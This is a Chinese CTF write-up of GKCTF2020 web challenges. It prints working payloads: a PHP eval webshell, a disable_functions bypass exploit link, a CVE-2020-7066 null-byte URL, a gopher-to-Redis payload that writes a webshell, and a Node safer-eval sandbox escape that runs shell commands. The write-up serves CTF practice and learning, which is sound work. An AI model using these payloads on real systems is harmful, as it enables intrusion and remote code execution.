---
title: GKCTF2020复现
date: 2020-06-20
image: 
description: 防灾科技学院主办的比赛
categories: 
- ctf_writeup
tags:
- disable_functions
- SSRF
- Redis
- NodeJS
---
GKCTF，题好平台棒，因为那段时间比赛太多就没打，现在填坑

------

### [CheckIN](https://buuoj.cn/challenges#[GKCTF2020]CheckIN)

考点：PHP73 bypass disable_functions

打开题目是源码：

```
<title>Check_In</title>
<?php
highlight_file(__FILE__);
class ClassName
{
  public $code = null;
  public $decode = null;
  function __construct()
  {
    $this->code = @$this->x()['Ginkgo'];
    $this->decode = @base64_decode( $this->code );
    @Eval($this->decode);
  }
 
  public function x()
  {
    return $_REQUEST;
  }
}
 
new ClassName();
```

 

目标很明确，传入 `?Ginkgo=（PHP代码）` 就可以RCE，我们执行以下 `phpinfo()` 发现正常回显，但是system却没有回显。

我先构造一个shell蚁剑连接再说：`?Ginkgo=ZXZhbCgkX1BPU1RbJ2NtZCddKTs=` （?Ginkgo=eval($_POST['cmd']);）

连接上之后，可以使用文件系统，但是虚拟终端却不能执行命令，猜测是disable_functions，在phpinfo里面果然翻到了

![img](https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210120171337.png)

关于bypass diable_functions，这里推荐[一篇文章](https://www.cnblogs.com/hookjoy/p/10167315.html)

有四种绕过 `disable_functions` 的手法：

- 第一种，攻击后端组件，寻找存在命令注入的、web 应用常用的后端组件，如，ImageMagick 的魔图漏洞、bash 的破壳漏洞；
- 第二种，寻找未禁用的漏网函数，常见的执行命令的函数有 system()、exec()、shell_exec()、passthru()，偏僻的 popen()、proc_open()、pcntl_exec()，逐一尝试，或许有漏网之鱼；
- 第三种，mod_cgi 模式，尝试修改 `.htaccess`，调整请求访问路由，绕过 php.ini 中的任何限制；
- 第四种，利用环境变量 LD_PRELOAD 劫持系统函数，让外部程序加载恶意 *.so，达到执行系统命令的效果。

这里用的一个[bypass PHP7.0-7.3 disable_function的PoC](https://github.com/mm0r1/exploits/blob/master/php7-gc-bypass/exploit.php)，用蚁剑上传到/tmp，index包含他就可以看到结果了

![img](https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210120171346.png)

 

 

 

### [cve版签到](https://buuoj.cn/challenges#[GKCTF2020]cve版签到)

考点：cve-2020-7066

#### CVE-2020-7066

在低于7.2.29的PHP版本7.2.x，低于7.3.16的7.3.x和低于7.4.4的7.4.x中，将 `get_headers()` 与用户提供的URL一起使用时，如果URL包含零（\ 0）字符（不可见字符），则URL将被静默地截断。这可能会导致某些软件对 `get_headers()` 的目标做出错误的假设，并可能将某些信息发送到错误的服务器。

#### payload

```
?url=http://127.0.0.1%00\.ctfhub.com
```

得到一个hint：` Tips: Host must be end with '123'`

```
?url=http://127.0.0.123%00\.ctfhub.com
```

flag{1608cce2-94d1-4014-9927-a9738ea8280e}

 

 

 

### [老八小超市儿](https://buuoj.cn/challenges#[GKCTF2020]老八小超市儿)

考点：shopxo后台弱口令，安装主题Getshell，定时脚本利用

打开页面，在页脚发现一行话： `Powered by ShopXO v1.8.0`

对于ShopXO这个框架，网上大致三种利用方法：`CVE-2019-5886/7` ， `后台弱口令`

 

#### 弱口令

访问 `admin.php` ，用户名 `admin` 密码 `shopxo` 就进去了。。。

 

#### 后台利用主题安装Getshell

来到网站管理后台，在 `应用中心 -> 应用商店 -> 主题` 里面可以下载主题文件到本地

![img](https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210120171356.png)

然后在 `网站管理 -> 主题管理 -> 主题安装` 通过上传含有webshell的主题来获取一个webshell

F12可以看到shell的路径：
![img](https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210120171403.png)

访问发现页面存在，直接蚁剑连接；

 

#### 利用定时文件root权限读取flag

在根目录发现假的flag，旁边flag.hint

![img](https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210120171411.png)

发现每分钟内容都会变一次，然后找到了根目录的auto.sh

![img](https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210120171416.png)

直接访问这个py文件：

```
import os
import io
import time
os.system("whoami") 
gk1=str(time.ctime())
gk="\nGet the Root,The Date Is Userful!"
f=io.open("/flag.hint", "rb+")
f.write(str(gk1))
f.write(str(gk))
f.close()
```

猜测这个py文件的权限比较高，可以读取/root/flag，于是直接加两行：

```
import os
import io
import time
os.system("whoami") 
gk1=str(time.ctime())
gk="shit\n"
f=io.open("/flag.hint", "rb+")
#s=open("/root/flag","r").read()
s=os.system("cat /root/*|grep 'flag'")
f.write(s)
f.write(str(gk1))
f.write(str(gk))
f.close()
```

隔一会儿访问/flag.hint就有flag：

![img](https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210120171423.png)

 

 

 

### [EZ三剑客-EzWeb](https://buuoj.cn/challenges#[GKCTF2020]EZ三剑客-EzWeb)

考点：SSRF，file关键字绕过，gopher协议打redis未授权，redis写webshell

SSRF学习链接>>https://hackmd.io/@Lhaihai/H1B8PJ9hX

打开是一个提交URL的页面，输入127.0.0.1会回显"别这样"，盲猜SSRF；

 

#### 利用file协议尝试读取本机文件

```
file:///etc/passwd
```

回显"别这样"；

可以利用 `file:/etc/passwd` 绕过

读取index源码：

```
file:/var/www/html/index.php
```

得到：

```
function curl($url){  
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_HEADER, 0);
    echo curl_exec($ch);
    curl_close($ch);
}
 
if(isset($_GET['submit'])){
		$url = $_GET['url'];
		//echo $url."\n";
		if(preg_match('/file\:\/\/|dict|\.\.\/|127.0.0.1|localhost/is', $url,$match))
		{
			//var_dump($match);
			die('别这样');
		}
		curl($url);
}
if(isset($_GET['secret'])){
	system('ifconfig');
}
?>
```

可以看到，确实是ban掉了`file://` `dict` 等关键字。

但是flag貌似并不在这台机器上面；

读取/etc/hosts和/proc/net/arp文件之后都没有发现什么有用的东西，ifconfig回显里面给出了本机的内网ip，于是去尝试爆破C段；

 

#### 利用bp的intruder模块爆破C段

发到intruder，设置Position和Payload，在xx.xx.xx.11发现了回显：

![img](https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210120171432.png)

继续尝试爆破端口，发现6379的redis报错（其实猜也能猜，一般就是3306和6379）

 

#### 利用gopher协议打内网未授权redis

之前说过ban了dict，我们这里还有gopher协议；

直接往web路径写shell：

```
gopher://173.169.113.11:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2434%0D%0A%0A%0A%3C%3Fphp%20system%28%24_GET%5B%27cmd%27%5D%29%3B%20%3F%3E%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2413%0D%0A/var/www/html%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%249%0D%0Ashell.php%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A%0A
```



直接前端提交：

```
173.169.113.11/shell.php?cmd=cat%20/flag
```

得到flag

 

 

 

### [[GKCTF2020\]EZ三剑客-EzNode](https://buuoj.cn/challenges#[GKCTF2020]EZ三剑客-EzNode)

考点：NodeJs审计、settimeout函数漏洞

参考>>[Guoke师傅](https://guokeya.github.io/post/a45x0caHd/)

打开页面是个计算器，给了源码：

```
const express = require('express');
const bodyParser = require('body-parser');
 
const saferEval = require('safer-eval'); // 2019.7/WORKER1 找到一个很棒的库
 
const fs = require('fs');
 
const app = express();
 
 
app.use(bodyParser.urlencoded({ extended: false }));
app.use(bodyParser.json());
 
// 2020.1/WORKER2 老板说为了后期方便优化
app.use((req, res, next) => {
  if (req.path === '/eval') {//如果请求路径是/eval，就执行
    let delay = 60 * 1000;//定义一个变量delay
    console.log(delay);
    if (Number.isInteger(parseInt(req.query.delay))) {//如果请求参数delay是整数，就把传入的和之前定义取最大值复制给delay
      delay = Math.max(delay, parseInt(req.query.delay));
    }
    const t = setTimeout(() => next(), delay);//设置超时，如果超时就进入下一个路由
    // 2020.1/WORKER3 老板说让我优化一下速度，我就直接这样写了，其他人写了啥关我p事
    setTimeout(() => {
      clearTimeout(t);
      console.log('timeout');
      try {
        res.send('Timeout!');
      } catch (e) {
 
      }
    }, 1000);//超时一秒就就执行timeout
  } else {
    next();
  }
});
 
app.post('/eval', function (req, res) {
  let response = '';
  if (req.body.e) {
    try {
      response = saferEval(req.body.e);//可执行恶意代码
    } catch (e) {
      response = 'Wrong Wrong Wrong!!!!';
    }
  }
  res.send(String(response));
});
 
// 2019.10/WORKER1 老板娘说她要看到我们的源代码，用行数计算KPI
app.get('/source', function (req, res) {
  res.set('Content-Type', 'text/javascript;charset=utf-8');
  res.send(fs.readFileSync('./index.js'));
});
 
// 2019.12/WORKER3 为了方便我自己查看版本，加上这个接口
app.get('/version', function (req, res) {
  res.set('Content-Type', 'text/json;charset=utf-8');
  res.send(fs.readFileSync('./package.json'));
});
 
app.get('/', function (req, res) {
  res.set('Content-Type', 'text/html;charset=utf-8');
  res.send(fs.readFileSync('./index.html'))
})
 
app.listen(80, '0.0.0.0', () => {
  console.log('Start listening')
});
```

主要就是要看懂代码，大概意思就是：

我们传入一个delay和原来的delay比较，取最大值，然后作为形参传给timeout这个函数，如果代码执行的时间超过了这个值，就执行eval；

问题就出在这个settimeout函数上。

 

#### interger超过2147483647可以使int溢出

这里借用[Guoke](https://guokeya.github.io/post/a45x0caHd/)师傅的一张图：

![img](https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210120171441.png)

 

#### 沙箱逃逸，原型链污染

https://xz.aliyun.com/t/7842

GET传入：

```
?delay=2147483648
```

POST：

```
e=clearImmediate.constructor("return process;")().mainModule.require("child_process").execSync("cat /flag").toString()
```

得到flag；

flag{e8e4454d-c127-4caf-89e2-86e266c83aa1}